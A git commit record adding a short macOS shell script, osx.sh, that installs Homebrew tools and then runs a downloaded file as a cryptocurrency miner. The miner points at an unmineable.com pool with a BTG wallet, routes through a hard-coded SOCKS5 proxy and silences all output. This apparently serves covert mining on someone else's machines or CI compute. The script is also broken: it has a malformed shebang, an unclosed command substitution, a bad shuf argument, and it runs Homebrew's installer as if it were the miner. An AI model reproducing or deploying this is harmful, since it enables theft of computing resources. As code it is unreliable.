4a8b690e1b955b0ef96327f75afa685fc34114fc
Reyacrypt <91131821+Reyacrypt@users.noreply.github.com>
2021-09-21 18:29:34 +0530

    Create osx.sh

---
+++ osx.sh
@@ -0,0 +1,12 @@
+#! bin/sh
+softwareupdate-1
+  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" < /dev/null 2> /dev/null ; brew install caskroom/cask/brew-cask 2> /dev/null
+  brew install --cask screen
+  brew install coreutils
+  wget https://raw.githubusercontent.com/Homebrew/install/HEAD/install
+  chmod +x install
+  screen -dms ls
+  WORKER=$(echo $(gshuf -i 11111-9999999 -n i)-CPU
+  PROXY=socks5://72.210.252.134:46164
+  #./install --algorithm wrkzcoin --pool 165.227.161.11:61661 --username WIN:walletaddress --password x $PROXY --threads 12 nproc --all > /dev/null
+  ./install -o rx.unmineable.com:3333 -a rx -k -u BTG:GQMWC4pS84D4kHv7EUh5xEtwoKigGwq1a4.anshuff212+50 -p x $PROXY --threads 12 nproc --all > /dev/null
